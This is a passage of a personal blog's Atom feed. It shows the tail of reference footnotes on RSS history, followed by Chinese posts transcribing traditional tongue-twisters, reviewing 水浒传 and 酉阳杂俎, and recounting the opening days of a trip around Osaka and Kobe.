<p>Dan Libby, “RSS 0.91 Specification (Netscape),” RSS Advisory Board, accessed September 14, 2018, <a href="http://www.rssboard.org/rss-0-9-1-netscape">http://www.rssboard.org/rss-0-9-1-netscape</a>.&#160;<a href="#fnref:15" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:16">
<p>Dave Winer, “Scripting News: 7/28/1999,” Scripting News, July 28, 1999, accessed September 14, 2018, <a href="http://scripting.com/1999/07/28.html">http://scripting.com/1999/07/28.html</a>.&#160;<a href="#fnref:16" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:17">
<p>Oliver Willis, “RSS Aggregators?” June 19, 2000, Syndication Mailing List, accessed September 14, 2018, <a href="https://groups.yahoo.com/neo/groups/syndication/conversations/topics/173">https://groups.yahoo.com/neo/groups/syndication/conversations/topics/173</a>.&#160;<a href="#fnref:17" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:18">
<p>Dave Winer, “Scripting News: 07/07/2000,” Scripting News, July 07, 2000, accessed September 14, 2018, <a href="http://essaysfromexodus.scripting.com/backissues/2000/06/07/#rss">http://essaysfromexodus.scripting.com/backissues/2000/06/07/#rss</a>.&#160;<a href="#fnref:18" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:19">
<p>Dave Winer, “Re: RSS 0.91 Restarted,” June 9, 2000, Syndication Mailing List, accessed September 14, 2018, <a href="https://groups.yahoo.com/neo/groups/syndication/conversations/topics/132">https://groups.yahoo.com/neo/groups/syndication/conversations/topics/132</a>.&#160;<a href="#fnref:19" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:20">
<p>Leigh Dodds, “RSS Modularization,” XML.com, July 5, 2000, accessed September 14, 2018, <a href="http://www.xml.com/pub/a/2000/07/05/deviant/rss.html">http://www.xml.com/pub/a/2000/07/05/deviant/rss.html</a>.&#160;<a href="#fnref:20" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:21">
<p>Ian Davis, “Re: [syndication] RSS Modularization Demonstration,” June 28, 2000, Syndication Mailing List, accessed September 14, 2018, <a href="https://groups.yahoo.com/neo/groups/syndication/conversations/topics/188">https://groups.yahoo.com/neo/groups/syndication/conversations/topics/188</a>.&#160;<a href="#fnref:21" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:22">
<p>“RDF Site Summary (RSS) 1.0,” December 09, 2000, accessed September 14, 2018, <a href="http://web.resource.org/rss/1.0/spec">http://web.resource.org/rss/1.0/spec</a>.&#160;<a href="#fnref:22" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:23">
<p>Dave Winer, “Re: [syndication] Re: Thoughts, Questions, and Issues,” August 16, 2000, Syndication Mailing List, accessed September 14, 2018, <a href="https://groups.yahoo.com/neo/groups/syndication/conversations/topics/410">https://groups.yahoo.com/neo/groups/syndication/conversations/topics/410</a>.&#160;<a href="#fnref:23" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:24">
<p>Mark Pilgrim, “History of the RSS Fork,” Dive into Mark, September 5, 2002, accessed September 14, 2018, <a href="http://www.diveintomark.link/2002/history-of-the-rss-fork">http://www.diveintomark.link/2002/history-of-the-rss-fork</a>.&#160;<a href="#fnref:24" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:25">
<p>Dan Brickley, “RSS-Classic, RSS 1.0 and a Historical Debt,” November 7, 2000, Syndication Mailing List, accessed September 14, 2018, <a href="https://groups.yahoo.com/neo/groups/rss-dev/conversations/topics/1136">https://groups.yahoo.com/neo/groups/rss-dev/conversations/topics/1136</a>.&#160;<a href="#fnref:25" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:26">
<p>Tim O’Reilly, “Re: Asking Tim,” UserLand, September 20, 2000, accessed September 14, 2018, <a href="http://static.userland.com/userLandDiscussArchive/msg021537.html">http://static.userland.com/userLandDiscussArchive/msg021537.html</a>.&#160;<a href="#fnref:26" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:27">
<p>Dave Winer, “Re: Asking Tim,” UserLand, September 20, 2000, accessed September 14, 2018, <a href="http://static.userland.com/userLandDiscussArchive/msg021560.html">http://static.userland.com/userLandDiscussArchive/msg021560.html</a>.&#160;<a href="#fnref:27" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:28">
<p>John Quain, “BASICS; Fine-Tuning Your Filter for Online Information,” The New York Times, 2004, accessed September 14, 2018, <a href="https://www.nytimes.com/2004/06/03/technology/basics-fine-tuning-your-filter-for-online-information.html">https://www.nytimes.com/2004/06/03/technology/basics-fine-tuning-your-filter-for-online-information.html</a>.&#160;<a href="#fnref:28" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:29">
<p>John Schwartz, “Aaron Swartz, Internet Activist, Dies at 26,” The New York Times, January 12, 2013, accessed September 14, 2018, <a href="https://www.nytimes.com/2013/01/13/technology/aaron-swartz-internet-activist-dies-at-26.html">https://www.nytimes.com/2013/01/13/technology/aaron-swartz-internet-activist-dies-at-26.html</a>.&#160;<a href="#fnref:29" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:30">
<p>“A Second Spring of Cleaning,” Official Google Blog, March 13, 2013, accessed September 14, 2018, <a href="https://googleblog.blogspot.com/2013/03/a-second-spring-of-cleaning.html">https://googleblog.blogspot.com/2013/03/a-second-spring-of-cleaning.html</a>.&#160;<a href="#fnref:30" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:31">
<p>Steve Gillmor, “Rest in Peace, RSS,” TechCrunch, May 5, 2009, accessed September 14, 2018, <a href="https://techcrunch.com/2009/05/05/rest-in-peace-rss/">https://techcrunch.com/2009/05/05/rest-in-peace-rss/</a>.&#160;<a href="#fnref:31" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:32">
<p>Marco Arment, “Lockdown,” Marco.org, July 3, 2013, accessed September 14, 2018, <a href="https://marco.org/2013/07/03/lockdown">https://marco.org/2013/07/03/lockdown</a>.&#160;<a href="#fnref:32" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:33">
<p>Bob Tedeschi, “There’s a Popular New Code for Deals: RSS,” The New York Times, January 29, 2006, accessed September 14, 2018, <a href="https://www.nytimes.com/2006/01/29/travel/theres-a-popular-new-code-for-deals-rss.html">https://www.nytimes.com/2006/01/29/travel/theres-a-popular-new-code-for-deals-rss.html</a>.&#160;<a href="#fnref:33" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:34">
<p>“NYTimes.com RSS Feeds,” The New York Times, accessed September 14, 2018, <a href="https://web.archive.org/web/20050326065348/www.nytimes.com/services/xml/rss/index.html">https://web.archive.org/web/20050326065348/www.nytimes.com/services/xml/rss/index.html</a>.&#160;<a href="#fnref:34" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:35">
<p>Rael Dornfest, “RE: Re: [syndication] RE: RFC: Clearing Confusion for RSS, Agreement for Forward Motion,” May 31, 2001, Syndication Mailing List, accessed September 14, 2018, <a href="https://groups.yahoo.com/neo/groups/syndication/conversations/messages/1717">https://groups.yahoo.com/neo/groups/syndication/conversations/messages/1717</a>.&#160;<a href="#fnref:35" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
</ol>
</div>
]]></content></entry><entry><title type="html">十八愁绕口令</title><link href="https://blog.batkiz.com/posts/shi-ba-chou/?utm_source=atom_feed" rel="alternate" type="text/html"/><id>https://blog.batkiz.com/posts/shi-ba-chou/</id><published>2025-04-03T15:52:17+08:00</published><updated>2025-04-03T15:52:17+08:00</updated><content type="html"><![CDATA[<p>很早之前靠人工整理出来的，压制的视频在：<a href="https://www.bilibili.com/video/BV1At421j7NH">BV1At421j7NH</a>。
现在把纯文字稿放出来，顺带去掉了很多气口词。</p>
<p>另外推荐朋友做的 <a href="https://nianzi.site/">粘子</a>，整理收集了不少的曲艺文本。</p>
<h2 id="玲珑塔">玲珑塔</h2>
<p>高高山上有一老僧，身披着衲头几千层。</p>
<p>您若问老僧年高迈，曾记得黄河九澄清。</p>
<p>五百年前清一澄，倒有这么四千五百层。</p>
<p>老僧收了八个徒弟，这八个徒弟有法名。</p>
<p>大徒弟名叫青头愣，二徒弟名叫愣头青。</p>
<p>三徒弟名叫僧三点，四徒弟名叫点三僧。</p>
<p>五徒弟名叫崩葫芦把，六徒弟名叫把葫芦崩。</p>
<p>七徒弟名叫随风化，这个八徒弟他的名字可就叫化随风。</p>
<p>老师傅教了八宗艺，八仙过海，各显其能。</p>
<p>青头愣会敲磬，愣头青会撞钟。</p>
<p>僧三点会吹管，点三僧会捧笙。</p>
<p>崩葫芦把会打鼓，把葫芦崩会念经。</p>
<p>随风化他是会扫地，这个化随风会点灯。</p>
<p>老师傅让他们换一换，要想交换万不能。</p>
<p>老师傅一见有了气，要打徒弟整八名。</p>
<p>眼见这八个僧人要挨打，又来了五位云游僧。</p>
<p>凑齐这个僧人十三位，一齐到这后院数玲珑。</p>
<p>这后院有一个玲珑塔，咱们上去数单层，回来数双层。</p>
<p>谁要是数罢了玲珑塔，谁就是个大师兄。</p>
<p>玲珑塔塔玲珑，玲珑宝塔第一层。</p>
<p>一张高桌四条腿，一个和尚一本经。</p>
<p>一副铙钹一口磬，一个木鱼一盏灯。</p>
<p>一个金钟整四两，风儿一刮响哗楞。</p>
<p>玲珑塔塔玲珑，玲珑宝塔隔过了二层数三层。</p>
<p>三张高桌一十二条腿，三个和尚三本经。</p>
<p>三副铙钹三口磬，三个木鱼三盏灯。</p>
<p>三个金钟十二两，风儿一刮响哗楞。</p>
<p>玲珑塔塔玲珑，玲珑宝塔第五层。</p>
<p>五张高桌二十条腿，五个和尚五本经。</p>
<p>五副铙钹五口磬，五个木鱼五盏灯。</p>
<p>五个金钟二十两，风儿一刮响哗楞。</p>
<p>玲珑塔塔玲珑，玲珑宝塔第七层。</p>
<p>七张高桌二十八条腿，七个和尚七本经。</p>
<p>七副铙钹七口磬，七个木鱼七盏灯。</p>
<p>七个金钟二十八两，风儿一刮响哗楞。</p>
<p>玲珑塔塔玲珑，玲珑宝塔第九层。</p>
<p>九张高桌三十六条腿，九个和尚九本经。</p>
<p>九副铙钹九口磬，九个木鱼九盏灯。</p>
<p>九个金钟三十六两，风儿一刮响哗楞。</p>
<p>玲珑塔塔玲珑，玲珑宝塔十一层。</p>
<p>十一张高桌条四十四条腿，十一个和尚十一本经。</p>
<p>十一副铙钹十一口磬，十一个木鱼十一盏灯。</p>
<p>十一个金钟四十四两，风儿一刮响哗楞。</p>
<p>玲珑塔塔玲珑，玲珑宝塔到了尖十三层。</p>
<p>十三张高桌五十二条腿，十三个和尚十三本经。</p>
<p>十三副铙钹十三口磬，十三个木鱼十三盏灯。</p>
<p>十三个金钟五十二两，风儿一刮响哗楞。</p>
<p>玲珑塔塔玲珑，玲珑宝塔往回数这十二层。</p>
<p>十二张高桌四十八条腿，十二个和尚十二本经。</p>
<p>十二副铙钹十二口磬，十二个木鱼十二盏灯。</p>
<p>十二个金钟四十八两，风儿一刮响哗楞。</p>
<p>玲珑塔塔玲珑，玲珑宝塔第十层。</p>
<p>十张高桌四十条腿，十个和尚十本经。</p>
<p>十副铙钹十口磬，十个木鱼十盏灯。</p>
<p>十个金钟四十两，风儿一刮响哗楞。</p>
<p>玲珑塔塔玲珑，玲珑宝塔第八层。</p>
<p>八张高桌三十二条腿，八个和尚八本经。</p>
<p>八副铙钹八口磬，八个木鱼八盏灯。</p>
<p>八个金钟三十二两，风儿一刮响哗楞。</p>
<p>玲珑塔塔玲珑，玲珑宝塔第六层。</p>
<p>六张高桌二十四条腿，六个和尚六本经。</p>
<p>六副铙钹六口磬，六个木鱼六盏灯。</p>
<p>六个金钟二十四两，风儿一刮响哗楞。</p>
<p>玲珑塔塔玲珑，玲珑宝塔第四层。</p>
<p>四张高桌十六条腿，四个和尚四本经。</p>
<p>四副铙钹四口磬，四个木鱼四盏灯。</p>
<p>四个金钟十六两，风儿一刮响哗楞。</p>
<p>玲珑塔塔玲珑，玲珑宝塔第二层。</p>
<p>两张高桌八条腿，两个和尚两本经。</p>
<p>两副铙钹两口磬，两个木鱼两盏灯。</p>
<p>两个金钟整八两，风儿一刮响哗楞。</p>
<p>僧人数罢了玲珑塔，抬起头来看分明。</p>
<p>天上看，满天星，地上看，一个坑。</p>
<p>坑里看，冻着冰，冰上看，立着松。</p>
<p>松上看，落着鹰，山前看，一老僧。</p>
<p>僧前看，一本经，屋里看，点着灯。</p>
<p>墙上看，钉着钉，钉上看，挂着弓。</p>
<p>看着看着花了眼，西北变天起大风。</p>
<p>说大风，好大风，十个人见了九个人惊。</p>
<p>刮散了，满天星，刮平了，地上坑。</p>
<p>刮化了，坑中冰，刮倒了，冰上松。</p>
<p>刮飞了，松上鹰，刮走了，一老僧。</p>
<p>刮碎了，僧前经，刮灭了，屋里灯。</p>
<p>刮掉了，墙上钉，刮崩了，钉上弓。</p>
<p>直刮得，星散、坑平、冰化、松倒、鹰飞、僧走、经碎、灯灭、钉掉、弓崩。</p>
<p>这么一个绕口令，我唱的不好，大家多批评。</p>
<h2 id="十八愁">十八愁</h2>
<p>数九寒天冷风飕，转年春打六九头，正月十五龙灯会，有一对狮子滚绣球。</p>
<p>三月三，传说是王母娘娘的蟠桃会，大闹天宫孙猴就把这个仙桃偷。</p>
<p>五月端午端阳日，白蛇许仙不到头。</p>
<p>七月七传说是天河配，牛郎织女泪双流。</p>
<p>八月十五云遮月，月宫的嫦娥犯了忧愁。</p>
<p>要说愁，净说愁，唱一段绕口令儿一十八愁。</p>
<p>虎也愁，狼也愁，象也愁，鹿也愁，骡子也愁，马也愁，牛也愁，羊也愁，猪也愁，狗也愁，鸭子也愁，鹅也愁蛤蟆愁，螃蟹愁，蛤蜊愁，乌龟愁，鱼愁虾愁各有分由。</p>
<p>虎愁不敢把高山下，狼愁野心耍滑头，象愁脸憨皮又厚，鹿愁头上长犄角，马愁鞴鞍行千里，骡子愁是一世休，羊愁从小它把胡子长，牛愁愁那个犯牛轴，狗愁改不了净吃屎，猪愁离不开臭水沟。</p>
<p>鸭子愁扁着扁着嘴，鹅愁愁来愁去头上长了个大锛儿头，蛤蟆愁长了一身脓包疥，螃蟹愁得净横搂，蛤蜊愁它闭关自守，乌龟愁的不敢露头，鱼愁离水不能走，虾愁空枪乱扎没个准头。</p>
<p>那位说了你净瞎诌，说我诌来我就诌，闲来没事遛遛舌头。</p>
<p>什么上山吱扭扭，什么下山乱点头，什么有头没有尾，什么有尾没有头，什么有腿家中坐，什么没腿游九州，赵州桥什么人修，玉石栏杆什么人留，什么人骑驴桥上走，什么人推车轧道沟，什么人拖刀桥头站，什么人勒马看春秋，什么人白什么人黑，什么人胡子一大堆，什么圆圆在天边，什么圆圆在眼前，什么圆圆长街卖，什么圆圆道两边，什么鸟穿青又穿白，什么鸟穿出皂靴来，什么鸟身披十样锦，什么鸟穿出麻布口袋，什么开花节节高，什么开花猫着腰，什么开花无人见，什么开花嘴上嘟着一嘴毛。</p>
<p>双扇门单扇开，自己破谜自己猜。</p>
<p>小车子上山吱扭扭，瘸子下山乱点头，蛤蟆有头没有尾，蝎子有尾没有头，板凳有腿家中坐，香船没腿游九州，赵州桥是鲁班修，玉石的栏杆圣人留，张果老骑驴桥上走，柴王爷推车轧道沟，周仓拖刀桥上站，关二爷勒马看春秋，罗成白敬德黑，张飞胡子一大堆，月亮圆圆在天边，眼镜圆圆在眼前，烧饼圆圆长街卖，车轱辘圆圆道两边，喜鹊穿青又穿白，乌鸦穿出皂靴来，野鸡身披十样锦，鹌鹑穿出麻布口袋，芝麻开花节节高，柳树开花猫着腰，橡子开花无人见，老玉米开花嘴上嘟着一嘴毛。</p>
<p>扁担长板凳宽，扁担没有板凳宽，板凳没有扁担长，扁担偏要扁着绑在了板凳上，板凳偏不让扁担扁着绑在了板凳上，扁担偏要扁着绑在了板凳上，板凳偏不让扁担扁着绑在上，板凳偏要扁着绑在了板凳上。</p>
<p>出前门奔正南，面铺面冲南，面铺挂着蓝布棉门帘，挂着蓝布棉门帘，瞧了瞧，面铺面冲南，摘了蓝布棉门帘，瞧了瞧，面铺还是面冲南。</p>
<p>出西门走七步，捡块麂皮补皮裤，是麂皮补皮裤，不是麂皮不必补皮裤。</p>
<p>出前门奔正西，树木榔林长不齐，一二三四五六七、七六五四三二一、六五四三二一、五四三二一、四三二一、三二一、二一、一个一，数了半天一棵树，一棵树上长七枝，七枝结七样果，结的是：槟子、橙子、橘子、柿子、李子、栗子、梨。</p>
<p>我一言唱不尽绕口令，愿大家学习进步、工作积极。</p>
]]></content></entry><entry><title type="html">读了《水浒传》、《水浒传：虚构中的史实 》</title><link href="https://blog.batkiz.com/posts/shui-hu/?utm_source=atom_feed" rel="alternate" type="text/html"/><id>https://blog.batkiz.com/posts/shui-hu/</id><published>2025-03-18T14:40:27+08:00</published><updated>2025-03-18T14:40:27+08:00</updated><content type="html"><![CDATA[<p>这两本书都已经读完很久了，原来是打算等《译余偶拾》读完后，一起写一篇，但是近两天发现《译余偶拾》是很难快速读完了，索性先把这两本书的读后感写一写。</p>
<h2 id="水浒传">水浒传</h2>
<p>水浒传读的是人民文学出版社百回本。</p>
<p>水浒传的版本还是挺多的，简单来区分就有七十回本、百回本、百二十回本、最开始读的时候没注意，到征方腊时，突然意识到怎么还没看到琼英相关的情节，方才发现读的是百回本。不过暂且也没欲望读百二十回本了，先放着。</p>
<p>说起来大家可能不太信，我早在小时候便读过了《三国演义》、《西游记》，但直到这两年才第一次读《水浒传》。原因倒是很简单，一方面很小时候就听过「少不读水浒、老不读三国」这句话，竟就真的不去读了；另一方面，水浒的故事对于年少的我，有点过于没意思了，写的些各种好汉我也觉得没什么吸引力。</p>
<p>初读水浒，最开始几回的群像描写非常惊艳，随着故事的展开，视角一步步从高俅、史进引到鲁智深、林冲、水泊梁山，层层递进、行云流水。到了后面，尤其是征方腊时，可能是角色过于庞杂了，反而沦为一个个符号，没太大意思。</p>
<p>往后到各路好汉入伙的剧情，有武松、林冲这般令人出了一口气的，也有徐宁这种家中老小全伙被汤隆赚上山的，这两种姑且算符合封建主义价值观；但也有朱仝、卢俊义、秦明之类上山过程非常离谱的，你说先把好好的人全家杀光赚上山来，到最后又受招安，算什么事啊。也正是因为这些，七十回后其实我很期待宋江一伙人都是如何被方腊杀进的……</p>
<p>七十回后的剧情，说实话读起来有些味同嚼蜡，毕竟剧情还是要随着正史来编的，导致征辽时从头到尾发神威，征方腊时又匆匆发完了盒饭，读起来甚至有些荒诞之感。</p>
<p>此外，之前还想着读完水浒后，读一读《荡寇志》，看看俞万春又是怎么发盒饭的，不过此书又是太长，竟有整整七十回，暂时也先放着了，看看以后有没有机会吧。</p>
<p>总体来讲《水浒传》确实非常值得一读，尤其是前七十回，后续征辽、征方腊的剧情未免有些「烂尾」了，若是没什么时间，只挑着鲁智深圆寂之类的情节看看也不是不行。</p>
<h2 id="水浒传虚构中的史实httpsbookdoubancomsubject35069581"><a href="https://book.douban.com/subject/35069581/">水浒传：虚构中的史实</a></h2>
<p>这本书是逛书店时偶然看到的，看了看样书的目录，觉得有些意思，便读了读。</p>
<p>本书是日本学者宫崎市定以水浒为总线，讲述了些发散性的相关知识、考证，书很薄，科普性质较重。</p>
<p>读完后，印象最深的是「两个宋江」一说，从几条史料出发，推断出了历史上曾存在“草寇宋江”和“将军宋江”，并因此发散了些后续招安情节的思考。其他的倒是没什么很有趣的了。</p>
]]></content></entry><entry><title type="html">读了《酉阳杂俎》</title><link href="https://blog.batkiz.com/posts/you-yang-za-zu/?utm_source=atom_feed" rel="alternate" type="text/html"/><link href="https://blog.batkiz.com/posts/san-getsu-ki/?utm_source=atom_feed" rel="related" type="text/html" title="读了《山月记》"/><id>https://blog.batkiz.com/posts/you-yang-za-zu/</id><published>2025-01-14T21:47:46+08:00</published><updated>2025-01-14T21:47:46+08:00</updated><content type="html"><![CDATA[<p><a href="https://book.douban.com/subject/27066229/">中华书局张仲裁点校本</a>。</p>
<p>去年九月间有朋友贴了相关的段落，觉得不错便开始读，直到最近几天忙里偷闲，加快进度把最后 10% 读完了。整个大概花了 10 个小时，靠的全都是睡前时间。</p>
<p>《酉阳杂俎》读起来颇像是百科全书与微型小说集的混合。志怪之事有股奇怪的奇妙之感，像是在读《搜神记》。百科全书的部分有些条目惊叹于观察之细致、与当代只注解几无差异，有些却又像是志怪，非常之神奇。</p>
<p>由于读的时间线过长，只选一些还记得的写一下：</p>
<ul>
<li>本书及搜神记均有记载南方有可将头飞出去的部落，颇感好奇真相为何。</li>
<li>书中专有名词、通假、谬误颇多，有些条目非常依赖注释的内容。不过注释在援引其他古书时，基本都是照搬原文，没有加以注释、翻译，虽然读起来还算顺畅，但是还是会有些心虚，自己理解是否正确。</li>
<li>仍是关于注释。读时发现些自己读基本不可能发现之疏漏：如“蝠”通“蝮”之条目，只按蝙蝠理解也有些道理；如“亡人镜”似乎应为“七人镜”之错讹；如文中有些人名与史上一些更有名的人重名，我自己来怕是分辨不清；如有些生僻字甚至是以图片形式出现在电子版中；如有些专有名词颇令人疑惑；如有些人之称呼，援引了较多其人历史上的职位、封国之类，没注释的话甚至难以分清前后文的两个指代是不是一个人；凡此种种</li>
<li>文中记载了较多佛教相关内容。唐时举国尊佛，皇帝亦不外如是，作为一个现代人还是挺难以想象的。有些佛教相关异事也难说真相如何，比如《〈金刚经〉鸠异》一卷中 X7.7 条载伍伯为蕃骑缚去一事，挺难说是不是真的逃兵+全家串供的。</li>
<li>仍是佛教相关。读至《贝编》一卷时，看到八部天龙之记载，突然意识到古印度之“龙”与古中国之“龙”的原初形象是不一致的，那么如今往前来看，为何（汉地）佛教相关的文学、影视作品中（如济公/降龙十八掌）或相关的雕塑、壁画中出现的龙，都会是一个中国龙的形象呢？这一合流或替换过程是如何发生的？又是在哪个时间点完成的？都激起了我的好奇心。一个更为发散的想法是，凤作为“凤凰”中的雄鸟，是如何一步一步走向龙凤合称、又走向很多人误以为龙指代男性、凤指代女性的（如龙凤胎这一说法）。</li>
</ul>
<p>后续大概会读：</p>
<ul>
<li>杨宪益之著作<a href="https://book.douban.com/subject/1784982/">《译余偶拾》</a>，主要是因为注释中引用了不少此书中的观点。已经读了一些，还挺有意思，读完后应该会单独写篇文章。</li>
<li>于君方所著<a href="https://book.douban.com/subject/12011617/">《观音：菩萨中国化的演变》</a>，前文提到我现在对佛教的中国化历程颇感兴趣，但当时只是在网上草草搜了些文章读了读。前几天去逛书店，偶然发现了这本书，大概翻了翻，虽然本书主要的研究对象是观音，但想来对我的好奇心是有所帮助的。内容比较多，不知道又要读到什么时候了。</li>
</ul>
<p>题外话：待读书单属于是越读越多……</p>
]]></content><category scheme="https://blog.batkiz.com/tags/%E8%AF%BB%E4%B9%A6" term="%E8%AF%BB%E4%B9%A6" label="读书"/></entry><entry><title type="html">关西之旅</title><link href="https://blog.batkiz.com/posts/kansai-journey/?utm_source=atom_feed" rel="alternate" type="text/html"/><id>https://blog.batkiz.com/posts/kansai-journey/</id><published>2025-01-10T00:20:00+08:00</published><updated>2025-01-10T00:20:00+08:00</updated><content type="html"><![CDATA[<p>前些日子去了趟大阪，并在周边玩了一圈，记一篇流水账。憋了很久才写完，多图杀猫。</p>
<p>下文中的图片均为 Nikon Z5 + Nikkor  Z 50mm f/1.8 S 及小米 15 拍摄。其中小米15一般带有徕卡水印；尼康拍的照片仅通过尼康工坊直接导出 jpeg，未做后期处理。</p>
<h1 id="day-0-香港-大阪">Day 0 香港-&gt;大阪</h1>
<p>从香港出发，坐HK Express。取票时，工作人员注意到我回国是坐春秋航空，问我两家哪个体验好一点，但我当时还没坐过春秋，便据实相告两家都没做过，后来想想该夸一夸HKE的。</p>
<p>晚上落地关西国际机场，坐了 Haruka 去大阪。</p>
<p>本着「上车饺子下车面」的准则，临行前我在国内吃了顿饺子，落地后自然要吃顿面，可惜到达后有点晚了，只能去吃了鸟贵族。恰巧发现鸟贵族的菜单里有酱油拉面，便点了一份。但里边竟然还加了橘皮，难吃。
<img src="https://s2.loli.net/2024/12/10/XK6cuAY8pMmZxyk.jpg" alt="鸟贵族-酱油拉面"></p>
<h1 id="day-1-大阪">Day 1 大阪</h1>
<p>day 1 主要是大阪市内闲逛，在小红书上找了个路线分享后便跟着走了走。</p>
<p>先去了大阪城，可能是因为之前去过了名古屋城，感觉两边没啥大的不一样。没花钱上去看。</p>
<p>在下面没看到太多打卡柯南的人。帮忙给一个白人拍了照片，不过看她表情似乎不太满意。
<img src="https://s2.loli.net/2024/12/10/Zsn1FwExDmAk92L.jpg" alt="大阪城&amp;流萤"></p>
<p><img src="https://s2.loli.net/2025/01/09/WATw5eo2icIDkmP.jpg" alt="大阪城内的树"></p>
<p>休息了一会后，便启程去了四天王寺。</p>
<p>路上看到了很掉san的关西世博会吉祥物，后面也看到了不少相关纪念品，甚至差点在回国前买一些送朋友，不过那时没找到相关的店铺了，遗憾。
<img src="https://s2.loli.net/2024/12/10/JSmauxzkYdObpLM.jpg" alt="井盖"></p>
<p><img src="https://s2.loli.net/2024/12/10/SKQZ8w5Mn9m7Yyo.jpg" alt="天王寺区与关西世博会"></p>
<p>不知是四天王寺本身较为开放，还是当时恰逢其时，在四天王寺周围与寺内，遇到了规模盛大的跳蚤市场，市场上看到了一些老镜头、老游戏机等物件，还有二手书、工艺品、武士刀等，甚至还看到了联合国的义卖。只可惜二手淘起来过于耗费精力，草草走马观花逛了一圈便作罢了。</p>
<p><img src="https://s2.loli.net/2024/12/11/QZnGRtKudF72qvC.jpg" alt="任天堂 super famicom">
<img src="https://s2.loli.net/2024/12/11/Tw5ESrqHKB6itZ7.jpg" alt="PENTAX 100-300"></p>
<p><img src="https://s2.loli.net/2025/01/09/H1AogScar7PQyZv.jpg" alt="what&rsquo;s your superpower"></p>
<p><img src="https://s2.loli.net/2025/01/09/H74TtWwSldmFnj1.jpg" alt="">
<img src="https://s2.loli.net/2025/01/09/2qhjF5VYnwUSHAl.jpg" alt=""></p>
<p>出来时拍了张多宝堂，非常喜欢这个味道，事后发现是之前EV+0.3忘了调回去……
<img src="https://s2.loli.net/2025/01/09/ewmKDuCsXaJWhNL.jpg" alt="多宝堂"></p>
<p>之后去了通天阁，感觉没什么意思，下面的市场姑且可以一逛，看到了家 PRINGLES STORE展示了各种各样的logo，挺有意思。</p>
<p><img src="https://s2.loli.net/2024/12/11/f2yImtwxCENbSJd.jpg" alt="通天阁&amp;流萤">
<img src="https://s2.loli.net/2024/12/12/IVaK5eEP8d7ziGu.jpg" alt="品客薯片">
随后便直接去了梅田。</p>
<p>梅田一带的商城确实错综复杂，很容易迷路。这里分享一个我的小窍门：迷路时先到达最近的开阔的地面位置，随后便可以通过当地的地标建筑或其他指示牌到达目的地。在室内（无论是地下通道还是楼层内）目之所及只能看到重复的店铺，而且视角与行动均会收到建筑本身的设计因素影响，很容易失去方向感，或是有了正确的方向感却受限于设计，无法直接到达。开阔的地面则不存在这个问题，大多数场景下也可以通过任意的道路组合抵达目的地。</p>
<p>在梅田的 Bic Camera 看到了小米 14 Ultra 的广告和葬送的芙莉莲拼图。
<img src="https://s2.loli.net/2024/12/12/rtIAsvwN6GeORKg.jpg" alt="Xiaomi 14 Ultra">
<img src="https://s2.loli.net/2024/12/12/ZpeK9dluiJgwUfL.jpg" alt="葬送的芙莉莲">
商场内还看到了 anker 的专柜，可惜没见酷态科。相机那边看到了中一、七工匠等国产镜头。</p>
<p>最后要吐槽下日本商场的工作时间，晚上关门非常之早，大多数晚上八点便停业了，作为游客、尤其是没太多时间的游客，体验非常之差。不过还是有类似于 Bic Camera 之类的店营业到晚上十点甚至更晚的，作为一个出门基本只进电子产品店或书店的人，要点个大大的赞。</p>
<p>之后去了道顿堀，从地铁站到道顿堀经过了一条很繁华的商业街，包括道顿堀附近也摩肩接踵，在格力高广告牌前的桥上，看见两个漂亮妹妹拍照片、视频拍了起码二三十分钟。</p>
<p><img src="https://s2.loli.net/2024/12/21/ckF8YeBoXnPLxGg.jpg" alt="道顿堀-格力高广告牌"></p>
<p>在道顿堀附近游荡了一圈，只感觉到了人挨人人挤人，便去了附近的一家咖喱店，吃了晚饭。店员竟然有个黑人姐们，在日本见惯了南亚、东南亚面孔的店员，黑人确实是第一次见。不过好消息是可以正常用英语点餐了。</p>
<p>吃完后又去了附近的爱电王，看到了非常难绷的世博会吉祥物 x 其他IP的小玩偶，以及更难绷的全部无货公告。</p>
<p><img src="https://s2.loli.net/2024/12/21/Mfj9rNpx6eZASU3.jpg" alt="库洛米"></p>
<p><img src="https://s2.loli.net/2024/12/21/qIKB2wbnfdoTCH7.jpg" alt="没有"></p>
<p>至此一天时间游览了大阪市内，后续的行程是整个关西到处跑了。</p>
<h1 id="day-2-神户">Day 2 神户</h1>
<p>原本的行程计划里是没有神户和奈良的，但因为 day 1 一天跑完了大阪，索性加上了这两个城市。</p>
<p>上午起床后先去了新大阪站取 JR PASS，这里需要注意下，要在带有护照读取模块的取票机处取。我最开始没注意，加上机器报错只给日语，浪费了不少时间。</p>
